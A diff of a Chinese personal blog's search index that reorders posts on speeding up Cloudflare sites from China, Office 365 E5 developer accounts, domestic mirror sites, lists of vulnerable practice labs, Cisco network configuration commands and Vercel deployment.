Partner通过CNAME接入的方法基本上都全死光了，那现在应该怎么办呢？后来我搜了一下，Cloudflare原来已经提供了官方通过CNAME接入的方法（应该是新加的功能），除了要绑信用卡之外就没别的要求了。<br>在使用这个功能之前，必须先有2个域名，一个是不重要的域名，通过NS方式接入Cloudflare，另一个是主要使用的域名，可以接到Cloudflare上，也可以接到别的NS服务商上。然后在那个不重要的域名中先设定好源站的解析，可以解析到“@”或者随便一个二级域名也可以，并且打开代理。然后点开SSL&#x2F;TLS-&gt;自定义主机名，第一次使用需要绑定信用卡或者PayPal，好像是因为它是个什么预付费的项目，免费100个CNAME，超过100个每个0.1USD。打开以后在回退源中输入刚刚设置好解析的那个域名，当回退源状态显示有效后就可以添加自定义主机名了。这里添加的主机名就是主要使用的域名，输入后根据提示在主域名上设定好TXT记录，完成后只要看到刚刚设定的主机名后面跟了两个有效就可以了。<br>这样准备工作就做完了，现在只要把主域名的解析设定到Cloudflare网络的任意节点，它就会自动连接到不重要的域名所解析的IP上。至于怎么获得优秀的IP，就可以像普通用户那样操作了，获得优秀的IP以后我们就可以设定一个A记录解析过去。<br>不过这里需要注意一些地方，如果使用的优选IP是Cloudflare官方的IP，那基本上也不会有什么问题，只是这个IP可能有些地区还是会访问缓慢，毕竟它也算是在重点关注对象中。如果是选择第三方节点IP，大多数情况速度都能保障，但是有个很大的问题就是那些节点的主人如果发现了你在使用他们的节点，他们是可以很轻易的进行中间人攻击的，毕竟域名都解析过去了，整个SSL证书也很简单，为了能避免这个问题一定要开启“证书透明度监视”保证能在第一时间避免有人进行中间人攻击。另外还有一个问题就是既然第三方IP可以匿名，那么网站也没办法获取到用户的真实IP地址了，像Cloudflare一些根据IP的防火墙也会无法生效，像WAF中的速率限制规则是万万不能开的，开了很大可能网站就访问不了了。还有就是DDoS是可以击垮第三方节点的，可能会使网站的可用性下降。所以如果对速度没有特别在意的情况下还是解析到官方IP上更好一些。<br>所以为了避免节点可能会用不了的情况，我有个想法（因为我没有大陆地区的服务器所以只是设想），之前我用过一个可以给Cloudflare设定DDNS的脚本，叫<a href="https://github.com/aipeach/cloudflare-api-v4-ddns">cloudflare-api-v4-ddns</a>，原本它是去请求获取本机IP的API设定解析的，那么如果把上面优选IP的结果输入到这个脚本中，放到国内的服务器上，每天自动执行一次，那这样我的网站不就会一直使用最优秀的IP了嘛，可惜我没有国内的服务器，改起来还要费点事就算了吧。</p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>有了很多辅助的工具，能让Cloudflare不再成为减速CDN，那它岂不是可以吊打国内其他CDN厂商了?，果然还是良心厂商啊。</p>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>cloudflare</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>最简单的白嫖office 365 E5 账号</title>
+    <url>/2023/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BD%E5%AB%96office-365-E5-%E8%B4%A6%E5%8F%B7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>office 365 E5 账号教程</p>
+<span id="more"></span>
+
+<p>注册入口</p>
+<p><a href="https://developer.microsoft.com/zh-cn/microsoft-365/dev-program">https://developer.microsoft.com/zh-cn/microsoft-365/dev-program</a></p>
+<p>1T改成5T</p>
+<p><a href="https://admin.onedrive.com/?v=StorageSettings">https://admin.onedrive.com/?v=StorageSettings</a></p>
+<p>添加新用户</p>
+<p><a href="https://admin.microsoft.com/">https://admin.microsoft.com</a></p>
+<p>续签API设置</p>
+<p><a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps</a></p>
+<p>E5续签软件下载</p>
+<p><a href="https://e5renew.com/">https://e5renew.com/</a></p>
+<p>如果你有VPS可以尝试自建续订服务</p>
+]]></content>
+      <categories>
+        <category>实用分享</category>
+      </categories>
+      <tags>
+        <tag>Onedrive</tag>
       </tags>
   </entry>
   <entry>
@@ -1554,56 +1632,63 @@
       </tags>
   </entry>
   <entry>
-    <title>思科模拟器网络搭建命令</title>
-    <url>/2024/03/06/%E6%80%9D%E7%A7%91%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网络搭建</p>
+    <title>自由软件中国镜像站汇总</title>
+    <url>/2024/01/23/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6%E4%B8%AD%E5%9B%BD%E9%95%9C%E5%83%8F%E7%AB%99%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自由软件中国镜像站汇总</p>
 <span id="more"></span>
 
-<!--
-
-[toc]
-
-  -->
-
-<h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>R1&gt;<strong>enable</strong>    &#x2F;&#x2F;进入特权模式 <br /><br>R1#<strong>disable</strong>    &#x2F;&#x2F;退出特权模式 <br /><br>R1(config)#<strong>hostname</strong> SW1    &#x2F;&#x2F;更改主机名为SW1 <br /><br>R1(config)#<strong>interface</strong> Ethernet0&#x2F;1    &#x2F;&#x2F;进入e0&#x2F;1接口 <br /><br>R1(config-if)#<strong>no shutdown</strong>     &#x2F;&#x2F;开启接口及协议 <br /><br>R1(config-if)#<strong>shutdown</strong>    &#x2F;&#x2F;关闭接口 <br /><br>R1(config)#<strong>end</strong>    &#x2F;&#x2F;返回用户模式 <br /><br>R1#<strong>show ip interface brief</strong>    &#x2F;&#x2F;简要查看接口状态 <br /><br>R1#<strong>show running-config</strong>    &#x2F;&#x2F;查看已配置信息 <br /><br>R1#<strong>write</strong>    &#x2F;&#x2F;保存配置 <br /><br>R1(config)#<strong>interface</strong> Ethernet0&#x2F;1 <br /><br>R1(config-if)#<strong>ip address</strong> 172.1.0.129 255.255.255.192    &#x2F;&#x2F;为接口配置ip地址 <br /><br>R1(config-if)#<strong>ipv6 address</strong> 2012::1&#x2F;64    &#x2F;&#x2F;在接口上配置ipv6地址 <br /></p>
-<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>Switch&gt;enable <br /><br>Switch#config <br /><br>Switch(config)#<strong>hostname</strong> SW1 <br /><br>SW1(config)#<strong>vlan</strong> 2 <br /><br>SW1(config-vlan)#exit <br /><br>SW1(config)#<strong>interface vlan</strong> 2 <br /><br>SW1(config-if)#<strong>ip add</strong> 172.15.5.2 255.255.255.252 <br /><br>SW1(config-if)#exit <br /><br>SW1(config)#<strong>interface</strong> f0&#x2F;1	&#x2F;&#x2F;（进入端口） <br /><br>SW1(config-if)#<strong>switchport</strong> mode access  <br /><br>SW1(config-if)#<strong>switchport</strong> access vlan 2	&#x2F;&#x2F;（将valn2设进端口中） <br /><br>SW1(config-if)#no shutdown	&#x2F;&#x2F;（打开端口） <br /><br>SW1(config-if)#exit <br /><br>SW1(config)#exit <br /><br>SW1#<strong>show vlan</strong>	&#x2F;&#x2F;（查看vlan在哪个端口） <br /><br>SW1#**show interface **	&#x2F;&#x2F;(所有端口) <br />SW1#<strong>show ip interface brief</strong>    &#x2F;&#x2F;简要查看接口状态 <br /><br>SW1#<strong>show running-config</strong>    &#x2F;&#x2F;查看已配置信息 <br />SW1#show interface	&#x2F;&#x2F;端口名（单个端口） <br />SW1(config-if)#<strong>switchport</strong> mode trunk  &#x2F;&#x2F;设置接口为trunk</p>
-<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>1、防火墙的基本配置<br>ciscoasa&gt; en	<br>Password:	默认特权密码为空，直接回车即可<br>ciscoasa# conf t	<br>ciscoasa(config)# hostname 防火墙名称	<br>2、配置特权密码<br>asa(config)# enable password 密码	<br>3、配置远程登录密码（在使用Telnet或SSH时需要输入的密码）<br>asa(config)# passwd 密码	<br>4、配置接口名称和接口安全级别<br>asa(config)# in e0&#x2F;0	<br>asa(config-if)# nameif 接口名称	<br>asa(config-if)# security-level 安全级别{0~100}	<br>如果ASA的型号是5505，则不支持在物理接口上直接进行以上配置，必须通过VLAN虚接口来配置<br>asa(config)#int vlan 1	<br>asa(config-if)# nameif inside	<br>asa(config-if)# security-level 100	<br>asa(config-if)#ip add 10.1.1.254 255.255.255.0	<br>asa(config-if)# no shut	<br>查看conn表	<br>asa#show conn detail	<br>5、配置ACL<br>（1）允许入站连接<br>asa(config)# access-list out_to_in permit ip host 172.16.1.5 host 10.1.1.7	允许外网主机172.16.1.5访问内网主机10.1.1.7，out_to_in为ACL组名<br>asa(config)# access-group out_to_in in int outside	将组名为out_to_in的ACL应用在outside接口<br>（2）控制出站连接的流量<br>asa(config)# access-list in_to_out deny ip 10.0.0.0 255.0.0.0 any	拒绝内网10.0.0.0网段 访问外网所有网段<br>asa(config)# access-list in_to_out permit ip any any	允许其他所有流量通行，因为ACL有隐含的拒绝语句，所以配置ACL时，一般都需要允许所有流量<br>asa(config)# access-group in_to_out in int inside	应用在内网接口<br>（3）ACL其他配置<br>ICMP协议<br>默认情况下，禁止ICMP报文穿越ASA是基于安全性的考虑，有时候为了方便调试，可以配置暂时允许ICMP应答报文穿越ASA</p>
-<p>ciscoasa(config)# access-list 111 permit icmp any any	定义ACL<br>ciscoasa(config)# access-group 111 in int outside	应用到outside接口<br>6、配置静态路由<br>asa(config)# route outside 172.16.0.0 255.255.0.0 10.0.0.1	去往外网172.16.0.0网段的流量下一跳为10.0.0.1<br>asa(config)# route inside 192.168.1.0 255.255.255.0 192.168.2.1	去往内网192.168.1.0网段的流量下一跳为192.168.2.1<br>7、配置命令补充<br>no在前面，当配置错一条命令后，可以在原先的配置命令前加no即可删除配置错的那条命令</p>
-<p>ciscoasa# write memory	保存running configuration配置到startup configuration<br>ciscoasa# copy running-config startup-config	保存running configuration配置到startup configuration<br>ciscoasa(config)# clear configure all	清除running configuration的所有配置<br>ciscoasa(config)# clear configure access-list	清除所有acces-list命令的配置<br>ciscoasa(config)# clear configure access-list in_to_out	只清除access-list in_to_out 的配置<br>ciscoasa# write erase	删除startup-config配置文件<br>8、远程管理ASA<br>ASA支持三种主要的远程管理接入方式：Telnet 、ssh和ASDM</p>
-<p>（1）Telnet配置实例<br>由于使用Telnet远程管理是不安全的，所以一般禁止从外部接口使用Telnet接入，而只允许在内网使用Telnet</p>
-<p>配置允许从inside区域内的192.168.0.0&#x2F;24网段使用telnet接入	<br>ciscoasa(config-if)# telnet 192.168.0.0 255.255.255.0 inside(接口名字)	<br>或者允许单个主机Telnet防火墙（两者根据需要二选一即可）	<br>ciscoasa(config)# telnet 192.168.0.1 255.255.255.255 inside(接口名字)	<br>配置空闲超时时间为30分钟	<br>ciscoasa(config)# telnet timeout 30(1~1440min,默认5min)	<br>（2）配置SSH接入<br>配置主机名和域名，因为在生成RSA密钥对的过程中需要用到主机名和域名<br>ciscoasa(config-if)# host 主机名	配置主机名<br>aaa(config)# domain-name 域名{.com}	配置域名<br>aaa(config)# crypto key generate rsa modulus 1024	指定modulus的大小为1024位，大小可以为512位,768位,1024位或2048位，表示生成的RSA密钥的长度<br>aaa(config)# ssh 192.168.1.0 255.255.255.0 inside	允许内网1.0的网段SSH接入<br>aaa(config)# ssh 0 0 outside	允许外网任何主机SSH接入<br>aaa(config)# ssh timeout 30	配置超时时间为30分钟<br>aaa(config)# ssh version 2	启用SSH的版本2，该命令为可选<br>版本1和版本2，区别是安全机制不一样，配置SSH接入完成后，可以在outside区域内的主机上使用SecureCRT或putty等工具登录ASA的outside接口，注意ASA默认使用用户名为pix，密码为使用password命令设置的密码</p>
-<p>9、ASA防火墙配置NAT<br>（1）动态PAT转换配置<br>把内部全局地址10.1.1.2转换为30.1.1.100<br>ASA(config)# nat (×××ide){名称，outside或inside} nat名称 10.1.1.0 255.255.255.0	声明内部地址<br>ASA(config)# global (outside) nat名称 30.1.1.100-30.1.1.200	声明全局地址，nat名称与内部nat名称要相同<br>ASA(config)# show xlate detai	查看NAT地址转换表<br>转换为outside接口的地址<br>ASA(config)# nat (×××ide){名称，outside或inside} nat名称 10.1.1.0 255.255.255.0	声明内部地址，nat-id为1<br>ASA(config)# global (outside) 1 interface	声明内部地址全部转换为outside区域接口地址<br>（2）静态NAT转换配置<br>dmz区域的20.1.1.2 映射成公网地址100.1.1.1访问<br>ASA(config)# static (dmz,outside) 100.1.1.1 20.1.1.2	第一个IP地址是公网IP地址，第二地址是dmz区域服务器的真实IP地址<br>ASA(config)# access-list 100 permit ip host 30.1.1.2 host 100.1.1.1	<br>ASA(config)# access-group 100 in int outside	设置ACL允许outside区域访问dmz区域，但是访问的是映射后的地址<br>（3）静态PAT转换配置方法<br>将内部的服务器映射到公网同一个IP，不同端口号<br>ASA(config)# static (dmz,outside) tcp 100.1.1.1 http 20.1.1.2 http	<br>ASA(config)# static (dmz,outside) tcp 100.1.1.1 smtp 20.1.1.3 smtp	将内部服务器地址映射到同一个公网地址不同端口号<br>ASA(config)# access-list out_to_dmz permit ip host 30.1.1.2 host 100.1.1.1	<br>ASA(config)# access-group out_to_dmz in int outside	设置ACL允许outside区域访问dmz区域，但是访问的是映射后的地址<br>（4）NAT豁免配置方法<br>ASA(config)# nat-control	表示通过ASA防火墙的数据包都必须使用NAT地址转换技术<br>ASA(config)# access-list ACL组名 extended permit ip 10.1.1.0 255.255.255.0 30.1.1.0 255.255.255.0	<br>ASA(config)# nat (×××ide) 0 access-list ACL组名	×××ide接口应用ACL，注意nat名称为0 表示使用NAT豁免，优先级最高，就是ACL中的地址经过ASA防火墙时，不需要进行地址转换</p>
-<p>原文链接：<a href="https://blog.csdn.net/le616616/article/details/120644648">https://blog.csdn.net/le616616/article/details/120644648</a></p>
-<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><blockquote>
-<p>windows 与Linux配置</p>
-</blockquote>
-<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>暂无</p>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>暂无</p>
+<pre><code>阿里云镜像：http://mirrors.aliyun.com/ 
+网易开源镜像站：http://mirrors.163.com/
+搜狐开源镜像站：http://mirrors.sohu.com/
+北京交通大学开源镜像站：http://mirror.bjtu.edu.cn
+兰州大学开源软件镜像站：http://mirror.lzu.edu.cn/
+厦门大学开源软件镜像站：http://mirrors.xmu.edu.cn/
+上海交通大学开源软件镜像站：http://ftp.sjtu.edu.cn/
+清华大学开源软件镜像站：http://mirrors.tuna.tsinghua.edu.cn/
+天津大学开源软件镜像站：http://mirror.tju.edu.cn/
+中国科学技术大学开源软件镜像站：http://mirrors.ustc.edu.cn/
+东北大学开源软件镜像站：http://mirror.neu.edu.cn/
+东软信息学院开源软件镜像站：http://mirrors.neusoft.edu.cn/
+浙江大学开源软件镜像站：http://mirrors.zju.edu.cn
+北京理工大学开源软件镜像站：http://mirror.bit.edu.cn
+华中科技大学开源软件镜像站：http://mirrors.hust.edu.cn/
+中山大学开源软件镜像站：http://mirror.sysu.edu.cn/
+大连理工大学开源软件镜像站：http://mirror.dlut.edu.cn/
+</code></pre>
 ]]></content>
   </entry>
   <entry>
-    <title>提高Cloudflare站点在中国的体验</title>
-    <url>/2023/07/21/%E6%8F%90%E9%AB%98Cloudflare%E7%AB%99%E7%82%B9%E5%9C%A8%E4%B8%AD%E5%9B%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂</p>
+    <title>靶场篇</title>
+    <url>/2023/07/22/%E9%9D%B6%E5%9C%BA%E7%AF%87/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>DSVW、DVWA、vulhub、vulstudy、XSS-game、WebGoat</p>
 <span id="more"></span>
 
-<p>从此，Cloudflare不再是减速CDN了</p>
-<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>众所周知，因为很多人用Cloudflare当作梯子中转之类的原因，中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂。最近我发现了一个不错的办法可以在一定程度上避免这个问题，所以今天就来说一说。</p>
-<h1 id="普通用户的解决方法"><a href="#普通用户的解决方法" class="headerlink" title="普通用户的解决方法"></a>普通用户的解决方法</h1><p>对于网站的访问者来说，使用<a href="https://github.com/XIU2/CloudflareSpeedTest">CloudflareSpeedTest</a>这个工具就挺不错的，它能检测到当前网络连哪个IP是最好的。因为Cloudflare网络用的是Anycast，无论从哪个IP进入都可以，所以用这个检测出来的IP直接改Hosts访问就能解决访问网站慢的问题。<br>不过有些地区可能是服务商主动对Cloudflare的IP段进行限速，那这样有可能测试出来没有可以使用的节点，那么还有一种方法，网络上有些可能是企业之类的人会反代Cloudflare的网站用于解决在国内访问慢的问题，并且没有对host头做限制，那么这些第三方的节点同样也可以作为访问Cloudflare网站的方法。具体怎么找到这样的IP有一个<a href="https://github.com/ip-scanner/cloudflare">仓库</a>每天都会扫描全网去找像这样的节点。<br>当然这些节点也不是所有的IP从中国连接速度都很好，这时候可以把这个仓库的所有IP收集起来然后再丢给CloudflareSpeedTest去测试，具体我写了个简单的脚本来处理：</p>
-<pre><code>git clone https://github.com/ip-scanner/cloudflare.git
-cat cloudflare/*.txt &gt; proxy.txt
-./CloudflareST -allip -sl 0.1 -f proxy.txt -n 500
-</code></pre>
-<p>这样获得的第三方IP就基本上不会被限速，里面甚至有可能有通过IPLC或者IEPL的节点，包括拿来当梯子中转速度都几乎可以跑满带宽，另外还有一个优点是这样Cloudflare获得的IP就是第三方节点的IP，可以起到匿名的作用。</p>
-<h1 id="对于站长的解决方法"><a href="#对于站长的解决方法" class="headerlink" title="对于站长的解决方法"></a>对于站长的解决方法</h1><p>上面的方法相当于是用户自己去解决访问的问题，但是操作可能还是会有点复杂，所以对于网站站长来说不可能去期待访客通过这种方法来提高访问自己网站的速度。不过Cloudflare网站接入只能通过NS方式接入，这样接入的话域名解析的IP就是自动分配的，没办法自己设定解析，也就不能选择更合适的IP，另外之前用CF Partner通过CNAME接入的方法基本上都全死光了，那现在应该怎么办呢？后来我搜了一下，Cloudflare原来已经提供了官方通过CNAME接入的方法（应该是新加的功能），除了要绑信用卡之外就没别的要求了。<br>在使用这个功能之前，必须先有2个域名，一个是不重要的域名，通过NS方式接入Cloudflare，另一个是主要使用的域名，可以接到Cloudflare上，也可以接到别的NS服务商上。然后在那个不重要的域名中先设定好源站的解析，可以解析到“@”或者随便一个二级域名也可以，并且打开代理。然后点开SSL&#x2F;TLS-&gt;自定义主机名，第一次使用需要绑定信用卡或者PayPal，好像是因为它是个什么预付费的项目，免费100个CNAME，超过100个每个0.1USD。打开以后在回退源中输入刚刚设置好解析的那个域名，当回退源状态显示有效后就可以添加自定义主机名了。这里添加的主机名就是主要使用的域名，输入后根据提示在主域名上设定好TXT记录，完成后只要看到刚刚设定的主机名后面跟了两个有效就可以了。<br>这样准备工作就做完了，现在只要把主域名的解析设定到Cloudflare网络的任意节点，它就会自动连接到不重要的域名所解析的IP上。至于怎么获得优秀的IP，就可以像普通用户那样操作了，获得优秀的IP以后我们就可以设定一个A记录解析过去。<br>不过这里需要注意一些地方，如果使用的优选IP是Cloudflare官方的IP，那基本上也不会有什么问题，只是这个IP可能有些地区还是会访问缓慢，毕竟它也算是在重点关注对象中。如果是选择第三方节点IP，大多数情况速度都能保障，但是有个很大的问题就是那些节点的主人如果发现了你在使用他们的节点，他们是可以很轻易的进行中间人攻击的，毕竟域名都解析过去了，整个SSL证书也很简单，为了能避免这个问题一定要开启“证书透明度监视”保证能在第一时间避免有人进行中间人攻击。另外还有一个问题就是既然第三方IP可以匿名，那么网站也没办法获取到用户的真实IP地址了，像Cloudflare一些根据IP的防火墙也会无法生效，像WAF中的速率限制规则是万万不能开的，开了很大可能网站就访问不了了。还有就是DDoS是可以击垮第三方节点的，可能会使网站的可用性下降。所以如果对速度没有特别在意的情况下还是解析到官方IP上更好一些。<br>所以为了避免节点可能会用不了的情况，我有个想法（因为我没有大陆地区的服务器所以只是设想），之前我用过一个可以给Cloudflare设定DDNS的脚本，叫<a href="https://github.com/aipeach/cloudflare-api-v4-ddns">cloudflare-api-v4-ddns</a>，原本它是去请求获取本机IP的API设定解析的，那么如果把上面优选IP的结果输入到这个脚本中，放到国内的服务器上，每天自动执行一次，那这样我的网站不就会一直使用最优秀的IP了嘛，可惜我没有国内的服务器，改起来还要费点事就算了吧。</p>
-<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>有了很多辅助的工具，能让Cloudflare不再成为减速CDN，那它岂不是可以吊打国内其他CDN厂商了?，果然还是良心厂商啊。</p>
+<p><strong>1、DSVW</strong></p>
+<p><a href="https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW">https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-14.png" alt="图片"></p>
+<p><strong>2、DVWA</strong></p>
+<p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-15.png" alt="图片"></p>
+<p><strong>3、vulhub</strong></p>
+<p><a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-16.png" alt="图片"></p>
+<p><strong>4、vulstudy</strong></p>
+<p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-17.png" alt="图片"></p>
+<p><strong>5、XSS – game</strong></p>
+<p><a href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/#/0x00</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-18.png" alt="图片"></p>
+<p><a href="http://www.domxss.com/domxss/domxss.php">http://www.domxss.com/domxss/domxss.php</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-19.png" alt="图片"></p>
+<p><a href="http://prompt.ml/0">http://prompt.ml/0</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-20.png" alt="图片"></p>
+<p>6、WebGoat</p>
+<p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-21.png" alt="图片"></p>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
-      <tags>
-        <tag>cloudflare</tag>
-      </tags>
   </entry>
   <entry>
     <title>通过vercel搭建谷歌镜像站</title>
@@ -1673,7 +1758,7 @@ npm install -g cnpm --registry=https://registry.npm.taobao.org &amp;&amp; cnpm i
 <p>出现这个就代表登录成功啦</p>
 <p>You have been successfully authenticated as:</p>
 <p>CLI Login Success</p>
-<p><a href="mailto:&#120;&#120;&#120;&#120;&#120;&#64;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#x78;">&#120;&#120;&#120;&#120;&#120;&#64;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#x78;</a>(您的邮箱）</p>
+<p><a href="mailto:&#x78;&#120;&#120;&#120;&#x78;&#64;&#120;&#120;&#120;&#46;&#120;&#120;&#120;">&#x78;&#120;&#120;&#120;&#x78;&#64;&#120;&#120;&#120;&#46;&#120;&#120;&#120;</a>(您的邮箱）</p>
 <p>You can now close this tab and return to the CLI.</p>
 <p>登录成功之后，在电脑的c盘建一个文件夹（名字自定义，其实在哪都可以建，只要你能找到这个文件夹就可以），里面新建一个TXT文件，名称随意，打开输入以下信息</p>
 <pre><code>&#123;&quot;version&quot;: 2,&quot;routes&quot;: [&#123;&quot;src&quot;: &quot;/(.*)&quot;,&quot;dest&quot;: &quot;website/$1&quot;&#125; ]&#125;
@@ -1723,57 +1808,6 @@ npm install -g cnpm --registry=https://registry.npm.taobao.org &amp;&amp; cnpm i
         <tag>Google镜像</tag>
         <tag>vercel</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>最简单的白嫖office 365 E5 账号</title>
-    <url>/2023/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BD%E5%AB%96office-365-E5-%E8%B4%A6%E5%8F%B7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>office 365 E5 账号教程</p>
-<span id="more"></span>
-
-<p>注册入口</p>
-<p><a href="https://developer.microsoft.com/zh-cn/microsoft-365/dev-program">https://developer.microsoft.com/zh-cn/microsoft-365/dev-program</a></p>
-<p>1T改成5T</p>
-<p><a href="https://admin.onedrive.com/?v=StorageSettings">https://admin.onedrive.com/?v=StorageSettings</a></p>
-<p>添加新用户</p>
-<p><a href="https://admin.microsoft.com/">https://admin.microsoft.com</a></p>
-<p>续签API设置</p>
-<p><a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps</a></p>
-<p>E5续签软件下载</p>
-<p><a href="https://e5renew.com/">https://e5renew.com/</a></p>
-<p>如果你有VPS可以尝试自建续订服务</p>
-]]></content>
-      <categories>
-        <category>实用分享</category>
-      </categories>
-      <tags>
-        <tag>Onedrive</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>自由软件中国镜像站汇总</title>
-    <url>/2024/01/23/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6%E4%B8%AD%E5%9B%BD%E9%95%9C%E5%83%8F%E7%AB%99%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自由软件中国镜像站汇总</p>
-<span id="more"></span>
-
-<pre><code>阿里云镜像：http://mirrors.aliyun.com/ 
-网易开源镜像站：http://mirrors.163.com/
-搜狐开源镜像站：http://mirrors.sohu.com/
-北京交通大学开源镜像站：http://mirror.bjtu.edu.cn
-兰州大学开源软件镜像站：http://mirror.lzu.edu.cn/
-厦门大学开源软件镜像站：http://mirrors.xmu.edu.cn/
-上海交通大学开源软件镜像站：http://ftp.sjtu.edu.cn/
-清华大学开源软件镜像站：http://mirrors.tuna.tsinghua.edu.cn/
-天津大学开源软件镜像站：http://mirror.tju.edu.cn/
-中国科学技术大学开源软件镜像站：http://mirrors.ustc.edu.cn/
-东北大学开源软件镜像站：http://mirror.neu.edu.cn/
-东软信息学院开源软件镜像站：http://mirrors.neusoft.edu.cn/
-浙江大学开源软件镜像站：http://mirrors.zju.edu.cn
-北京理工大学开源软件镜像站：http://mirror.bit.edu.cn
-华中科技大学开源软件镜像站：http://mirrors.hust.edu.cn/
-中山大学开源软件镜像站：http://mirror.sysu.edu.cn/
-大连理工大学开源软件镜像站：http://mirror.dlut.edu.cn/
-</code></pre>
-]]></content>
   </entry>
   <entry>
     <title>记一次hugo推送配置</title>
@@ -1851,38 +1885,5 @@ cd ..
       <tags>
         <tag>hugo</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>靶场篇</title>
-    <url>/2023/07/22/%E9%9D%B6%E5%9C%BA%E7%AF%87/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>DSVW、DVWA、vulhub、vulstudy、XSS-game、WebGoat</p>
-<span id="more"></span>
-
-<p><strong>1、DSVW</strong></p>
-<p><a href="https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW">https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-14.png" alt="图片"></p>
-<p><strong>2、DVWA</strong></p>
-<p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-15.png" alt="图片"></p>
-<p><strong>3、vulhub</strong></p>
-<p><a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-16.png" alt="图片"></p>
